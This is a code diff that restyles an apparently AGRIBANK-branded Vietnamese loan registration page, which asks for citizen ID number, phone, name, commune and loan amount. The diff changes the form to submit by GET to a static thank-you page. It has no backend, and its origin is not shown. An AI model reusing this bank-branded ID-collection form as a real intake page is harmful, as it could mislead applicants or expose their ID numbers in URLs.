@@ -8,29 +8,39 @@
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            background: linear-gradient(135deg, #fff 60%, #b2222233 100%);
+            background: linear-gradient(120deg, #fff 60%, #b22222 100%);
             min-height: 100vh;
             margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .center-wrap {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            width: 100vw;
         }
         .container {
             width: 100%;
             max-width: 420px;
-            background: #fff;
-            padding: 38px 28px 32px 28px;
-            border-radius: 22px;
-            box-shadow: 0 8px 32px #b2222240;
-            border: 2.5px solid #b22222;
+            background: rgba(255,255,255,0.75);
+            padding: 44px 32px 36px 32px;
+            border-radius: 32px;
+            box-shadow: 0 8px 40px 0 #b2222240, 0 2px 16px #b2222211, 0 0 0 2.5px #fff, 0 0 0 6px #b2222222;
+            border: 1.5px solid #fff;
+            backdrop-filter: blur(16px) saturate(1.2);
             transition: box-shadow 0.3s, transform 0.3s;
-            margin: 32px 12px;
+            margin: 40px 12px;
+            animation: fadeInUp 0.7s cubic-bezier(.23,1.01,.32,1) 0.1s both;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .container:hover {
-            box-shadow: 0 16px 48px #b2222255;
+            box-shadow: 0 24px 64px #b2222255, 0 8px 32px #b2222211, 0 0 0 2.5px #fff, 0 0 0 10px #b2222222;
             transform: translateY(-4px) scale(1.01);
         }
         .logo {
@@ -39,60 +49,79 @@
             margin-bottom: 18px;
         }
         .logo img {
-            height: 100px;
+            height: 110px;
             width: auto;
             display: block;
             margin: 0 auto 10px auto;
-            border-radius: 16px;
-            box-shadow: 0 2px 12px #b2222222;
+            border-radius: 22px;
+            box-shadow: 0 4px 24px #b2222222, 0 0 0 4px #fff;
             background: #fff;
         }
         h2 {
             color: #b22222;
             text-align: center;
-            margin-bottom: 26px;
-            letter-spacing: 1px;
-            font-size: 1.8rem;
-            font-weight: 700;
+            margin-bottom: 32px;
+            letter-spacing: 1.5px;
+            font-size: 2.1rem;
+            font-weight: 800;
+            text-shadow: 0 2px 12px #b2222222;
         }
         label {
             display: block;
             margin-top: 14px;
             color: #b22222;
             font-weight: 500;
-            font-size: 0.97rem;
+            font-size: 1.05rem;
             margin-bottom: 2px;
+            letter-spacing: 0.2px;
         }
         .desc {
-            font-size: 0.84rem;
+            font-size: 0.89rem;
             color: #b2222288;
             margin-bottom: 2px;
             margin-left: 2px;
+        }
+        .input-icon {
+            position: relative;
+        }
+        .input-icon input,
+        .input-icon select {
+            padding-left: 44px;
+        }
+        .input-icon svg {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            height: 22px;
         }
         input, select {
             width: 100%;
             padding: 12px 14px;
             margin-top: 2px;
-            border-radius: 14px;
-            border: 1.7px solid #d32f2f;
-            background: #fff;
-            font-size: 1rem;
-            transition: border 0.2s, box-shadow 0.2s;
-            box-shadow: 0 1px 4px #d32f2f11;
-            height: 48px;
+            border-radius: 18px;
+            border: 1.7px solid #b22222;
+            background: rgba(255,255,255,0.95);
+            font-size: 1.07rem;
+            transition: border 0.2s, box-shadow 0.2s, transform 0.2s;
+            box-shadow: 0 2px 10px #b2222211;
+            height: 50px;
             box-sizing: border-box;
+            outline: none;
+        }
+        input:focus, select:focus {
+            border: 2.2px solid #b22222;
+            box-shadow: 0 0 0 6px #b2222222, 0 2px 12px #b2222211;
+            transform: scale(1.025);
+            background: #fff;
         }
         select {
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
-            background: #fff url('data:image/svg+xml;utf8,<svg fill="%23b22222" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>') no-repeat right 12px center/18px 18px;
-            padding-right: 38px;
-        }
-        input:focus, select:focus {
-            border: 2.2px solid #b22222;
-            outline: none;
-            box-shadow: 0 0 0 3px #b2222222;
+            background: #fff url('data:image/svg+xml;utf8,<svg fill="%23b22222" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>') no-repeat right 16px center/20px 20px;
+            padding-right: 44px;
         }
         .hidden {
             display: none;
@@ -101,24 +130,27 @@
             margin-top: 32px;
             padding: 14px 0;
             width: 100%;
-            background: linear-gradient(90deg, #b22222 60%, #d32f2f 100%);
+            background: linear-gradient(90deg, #b22222 0%, #d32f2f 100%);
+            background-size: 200% 200%;
             color: #fff;
             border: none;
-            border-radius: 14px;
+            border-radius: 22px;
             font-size: 1.18rem;
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 2px 12px #d32f2f33;
-            transition: background 0.2s, box-shadow 0.2s, transform 0.15s;
+            box-shadow: 0 4px 24px #b2222240, 0 0 0 2.5px #fff, 0 0 16px 2px #b22222cc;
+            transition: background 0.2s, box-shadow 0.2s, transform 0.15s, filter 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
+            filter: drop-shadow(0 2px 12px #b2222240);
         }
         button:hover {
-            background: linear-gradient(90deg, #d32f2f 60%, #b22222 100%);
-            box-shadow: 0 6px 24px #b2222233;
-            transform: translateY(-2px) scale(1.01);
+            background: linear-gradient(90deg, #d32f2f 0%, #b22222 100%);
+            box-shadow: 0 8px 32px #b2222255, 0 0 0 4px #fff, 0 0 24px 4px #b22222cc;
+            transform: translateY(-2px) scale(1.03);
+            filter: brightness(1.08) drop-shadow(0 4px 16px #b2222240);
         }
         ::placeholder {
             color: #b22222aa;
@@ -126,83 +158,99 @@
         }
         @media (max-width: 600px) {
             .container {
-                padding: 18px 4vw 18px 4vw;
-                border-radius: 12px;
+                padding: 12px 2vw 18px 2vw;
+                border-radius: 18px;
             }
             .logo img {
-                height: 60px;
+                height: 64px;
             }
             h2 {
-                font-size: 1.2rem;
+                font-size: 1.3rem;
+                margin-bottom: 18px;
             }
+            input, select {
+                font-size: 0.97rem;
+                height: 40px;
+            }
+            button {
+                font-size: 0.97rem;
+                padding: 10px 0;
+            }
+        }
+        /* Popup/toast */
+        .toast {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            background: #fff;
+            color: #b22222;
+            border: 2px solid #b22222;
+            border-radius: 14px;
+            box-shadow: 0 4px 24px #b2222240;
+            padding: 18px 32px 18px 24px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s, top 0.4s;
+        }
+        .toast.show {
+            opacity: 1;
+            top: 48px;
+            pointer-events: auto;
         }
     </style>
-    <script>
-        function handleLocationChange() {
-            var location = document.getElementById('location').value;
-            var outsideDiv = document.getElementById('outside-location');
-            var fulladdressInput = document.getElementById('fulladdress');
-            if (location === 'outside') {
-                outsideDiv.classList.remove('hidden');
-                fulladdressInput.required = true;
-            } else {
-                outsideDiv.classList.add('hidden');
-                fulladdressInput.required = false;
-            }
-        }
-    </script>
 </head>
 <body>
     <div class="center-wrap">
     <div class="container">
         <div class="logo">
-            <img src="agribank_logo.jpg" alt="AGRIBANK logo">
+            <img src="agribank_logo.png" alt="AGRIBANK logo">
         </div>
         <h2>Đăng ký vay vốn AGRIBANK</h2>
-        <form action="http://localhost:5000/submit" method="POST">
-            <label for="cccd">Số căn cước công dân:</label>
-            <div class="desc">Nhập đủ 12 số trên căn cước công dân</div>
-            <input type="text" id="cccd" name="cccd" required maxlength="12" pattern="\d{9,12}" placeholder="Nhập số CCCD">
-
-            <label for="phone">Số điện thoại:</label>
-            <div class="desc">Bắt đầu bằng số 0, gồm 10 số</div>
-            <input type="tel" id="phone" name="phone" required pattern="0\d{9}" maxlength="10" placeholder="Nhập số điện thoại">
-
-            <label for="fullname">Họ và tên:</label>
-            <input type="text" id="fullname" name="fullname" required placeholder="Nhập họ và tên">
-
-            <label for="location">Địa điểm:</label>
-            <select id="location" name="location" onchange="handleLocationChange()" required>
-                <option value="">-- Chọn địa điểm --</option>
-                <option value="nghixuan">Xã Nghi Xuân</option>
-                <option value="codam">Xã Cổ Đạm</option>
-                <option value="danhai">Xã Đan Hải</option>
-                <option value="tiendien">Xã Tiên Điền</option>
-                <option value="outside">Địa điểm ở ngoài</option>
-            </select>
-
-            <label for="specific_location">Địa điểm cụ thể:</label>
-            <div class="desc">Ví dụ: Thôn, xóm, số nhà, đường...</div>
-            <input type="text" id="specific_location" name="specific_location" required placeholder="Nhập địa điểm cụ thể">
-
-            <div id="outside-location" class="hidden">
-                <label for="fulladdress">Địa chỉ đầy đủ:</label>
-                <div class="desc">Nhập địa chỉ cụ thể nếu không thuộc các xã trên</div>
-                <input type="text" id="fulladdress" name="fulladdress" placeholder="Nhập địa chỉ đầy đủ">
+        <form action="thankyou.html" method="GET">
+            <div class="input-icon">
+                <label for="cccd">Số căn cước công dân:</label>
+                <div class="desc">Nhập đủ 12 số trên căn cước công dân</div>
+                <input type="text" id="cccd" name="cccd" required maxlength="12" pattern="\d{9,12}" placeholder="Nhập số CCCD">
             </div>
-
-            <label for="loan_purpose">Nhu cầu vay vốn:</label>
-            <input type="text" id="loan_purpose" name="loan_purpose" required placeholder="Nhập nhu cầu vay vốn">
-
-            <label for="loan_amount">Số vốn cần vay:</label>
-            <div class="desc">Chọn mức số tiền bạn muốn vay</div>
-            <select id="loan_amount" name="loan_amount" required>
-                <option value="">-- Chọn số tiền cần vay --</option>
-                <option value="<200">Dưới 200 triệu</option>
-                <option value="200-500">200 triệu đến 500 triệu</option>
-                <option value="500-1000">500 triệu đến dưới 1 tỷ</option>
-                <option value=">1000">Trên 1 tỷ</option>
-            </select>
+            <div class="input-icon">
+                <label for="phone">Số điện thoại:</label>
+                <div class="desc">Bắt đầu bằng số 0, gồm 10 số</div>
+                <input type="tel" id="phone" name="phone" required pattern="0\d{9}" maxlength="10" placeholder="Nhập số điện thoại">
+            </div>
+            <div class="input-icon">
+                <label for="fullname">Họ và tên:</label>
+                <input type="text" id="fullname" name="fullname" required placeholder="Nhập họ và tên">
+            </div>
+            <div>
+                <label for="location">Địa điểm:</label>
+                <select id="location" name="location" required>
+                    <option value="">-- Chọn địa điểm --</option>
+                    <option value="nghixuan">Xã Nghi Xuân</option>
+                    <option value="codam">Xã Cổ Đạm</option>
+                    <option value="danhai">Xã Đan Hải</option>
+                    <option value="tiendien">Xã Tiên Điền</option>
+                    <option value="outside">Địa điểm ở ngoài</option>
+                </select>
+            </div>
+            <div class="input-icon">
+                <label for="specific_location">Địa điểm cụ thể:</label>
+                <div class="desc">Ví dụ: Thôn, xóm, số nhà, đường...</div>
+                <input type="text" id="specific_location" name="specific_location" required placeholder="Nhập địa điểm cụ thể">
+            </div>
+            <div>
+                <label for="loan_amount">Số vốn cần vay:</label>
+                <div class="desc">Chọn mức số tiền bạn muốn vay</div>
+                <select id="loan_amount" name="loan_amount" required>
+                    <option value="">-- Chọn số tiền cần vay --</option>
+                    <option value="<200">Dưới 200 triệu</option>
+                    <option value="200-500">200 triệu đến 500 triệu</option>
+                    <option value="500-1000">500 triệu đến dưới 1 tỷ</option>
+                    <option value=">1000">Trên 1 tỷ</option>
+                </select>
+            </div>
 
             <button type="submit">
                 <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24"><path fill="#fff" d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
